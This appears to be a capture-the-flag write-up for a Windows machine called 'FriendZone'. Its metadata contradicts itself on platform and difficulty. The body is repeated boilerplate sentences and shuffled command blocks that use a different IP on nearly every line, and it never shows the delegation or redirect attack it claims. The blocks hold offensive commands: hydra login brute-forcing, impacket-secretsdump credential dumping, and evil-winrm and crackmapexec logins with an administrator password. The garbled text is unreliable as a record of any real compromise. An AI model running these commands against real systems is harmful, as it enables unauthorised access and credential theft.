---
TitleSEO: "OffSec Proving Grounds — FriendZone (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — FriendZone (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds FriendZone. Resource-Based Constrained Delegation and Open Redirect to achieve medium compromise on Windows."
Keywords: "web, active directory, insane, windows, pwntilldawn, forensics, reversing"
URL: "https://zurefx.github.io/writeups/htb-friendzone-625.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-friendzone-625/"
Date: "2026-01-10"
Tags: "Web, Active Directory, Insane, Windows, PwnTillDawn, Forensics, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-friendzone-625"
Permalink: "/writeups/htb-friendzone-625.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **FriendZone** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.125.161.188`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.42.36.64 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
crackmapexec smb 10.21.12.230 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.117.13
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.228.57 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

### Web Enumeration

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.25.75.213/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.79.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

Key finding: **SSTI**.

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.82.211 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.74.33.14/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.61.104.111
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.17.18 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.13.158.98 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
evil-winrm -i 10.111.37.41 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.232.145/FUZZ
```

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `atexec`
- `psexec`
- `pwncat`
- `rubeus`

### Key Takeaways

- Resource-Based Constrained Delegation
- Open Redirect
- SSTI
